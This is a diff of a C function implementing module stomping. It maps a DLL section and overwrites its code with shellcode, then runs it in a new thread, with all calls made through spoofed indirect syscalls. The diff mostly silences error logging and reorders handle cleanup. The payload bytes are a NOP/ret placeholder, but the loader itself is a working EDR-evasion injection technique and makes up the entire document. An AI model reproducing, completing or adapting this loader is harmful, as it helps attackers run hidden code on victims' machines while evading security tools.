@@ -6,7 +6,6 @@ BOOL ModuleStompPayload(PVX_TABLE pVxTable) {
     HANDLE hSection = NULL;
     PVOID pStompAddress = NULL;
     SIZE_T sViewSize = 0;
-
     // 1. 构造目标 DLL 的完整 NT 路径
     WCHAR szNtPath[] = { 
         L'\\', L'?', L'?', L'\\', 
@@ -34,12 +33,10 @@ BOOL ModuleStompPayload(PVX_TABLE pVxTable) {
         FILE_SHARE_READ,
         FILE_SYNCHRONOUS_IO_NONALERT // 选项
     );
-
     if (!NT_SUCCESS(status)) {
-        ERR("[-] NtOpenFile Failed: 0x%X", status);
+        //ERR("[-] NtOpenFile Failed: 0x%X", status);
         return FALSE;
     }
-
     // =========================================================================
     // NtCreateSection - 创建镜像节
     // ========================================================================= 
@@ -48,20 +45,17 @@ BOOL ModuleStompPayload(PVX_TABLE pVxTable) {
         &hSection,
         SECTION_ALL_ACCESS,
         NULL,
-        0,
+        (PVOID)0,
         PAGE_EXECUTE_READ,
         SEC_IMAGE, 
         hFile
     );
-
-    // 文件句柄用完可以关了
-    InvokeSpoofedSyscall(&pVxTable->NtClose, 1, hFile);
-
     if (!NT_SUCCESS(status)) {
-        ERR("[-] NtCreateSection Failed: 0x%X", status);
+        InvokeSpoofedSyscall(&pVxTable->NtClose, 1, hFile);
+        //ERR("[-] NtCreateSection Failed: 0x%X", status);
         return FALSE;
     }
-
+    InvokeSpoofedSyscall(&pVxTable->NtClose, 1, hFile);
     // =========================================================================
     // NtMapViewOfSection - 映射到内存
     // ========================================================================= 
@@ -71,8 +65,8 @@ BOOL ModuleStompPayload(PVX_TABLE pVxTable) {
         hSection,
         (HANDLE)-1, // 当前进程
         &pStompAddress,
-        0,
-        0,
+        (PVOID)0,
+        (PVOID)0,
         NULL,
         &sViewSize,
         2, // ViewShare (继承方式)
@@ -81,13 +75,11 @@ BOOL ModuleStompPayload(PVX_TABLE pVxTable) {
     );
     //关闭Section 句柄
     InvokeSpoofedSyscall(&pVxTable->NtClose, 1, hSection);
-
     if (!NT_SUCCESS(status)) {
         //ERR("[-] NtMapViewOfSection Failed: 0x%X", status);
         return FALSE;
     }
     // LOG("[+] DLL Mapped at: %p (Size: 0x%llX)", pStompAddress, sViewSize);
-    
     PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pStompAddress;
     PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pStompAddress + pDos->e_lfanew);
     PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
@@ -103,17 +95,14 @@ BOOL ModuleStompPayload(PVX_TABLE pVxTable) {
             break;
         }
     }
-
     if (!pCodeSection) {
         // ERR("[-] Code section not found");
         return FALSE;
     }
     // 4. 定义 Shellcode 
-    unsigned char shellcode[] =
-    "\x90\x90\x90\x90\x90\xc3";
+	unsigned char shellcode[] ="\x90";
         
     if (sizeof(shellcode) > sCodeSize){ 
-        printf("1");
         return FALSE;
     }
     // 5. 修改权限 RW 
@@ -121,15 +110,12 @@ BOOL ModuleStompPayload(PVX_TABLE pVxTable) {
     PVOID pProtectAddress = pCodeSection;
     SIZE_T sProtectSize = sizeof(shellcode);
     ULONG ulOldProtect = 0;
-
     status = InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
         (HANDLE)-1, &pProtectAddress, &sProtectSize, PAGE_READWRITE, &ulOldProtect);
 
     if (!NT_SUCCESS(status)) return FALSE;
-
     // 6. 写入 Payload
     VxMoveMemory(pCodeSection, shellcode, sizeof(shellcode));
-
     // 7. 恢复权限 RX
     status = InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
         (HANDLE)-1, &pProtectAddress, &sProtectSize, PAGE_EXECUTE_READ, &ulOldProtect);
@@ -141,7 +127,6 @@ BOOL ModuleStompPayload(PVX_TABLE pVxTable) {
     status = InvokeSpoofedSyscall(&pVxTable->NtCreateThreadEx, 11,
         &hThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)pCodeSection,
         NULL, FALSE, NULL, NULL, NULL, NULL);
-
     if (NT_SUCCESS(status)) {
          LARGE_INTEGER Timeout;
          Timeout.QuadPart = -10000000;
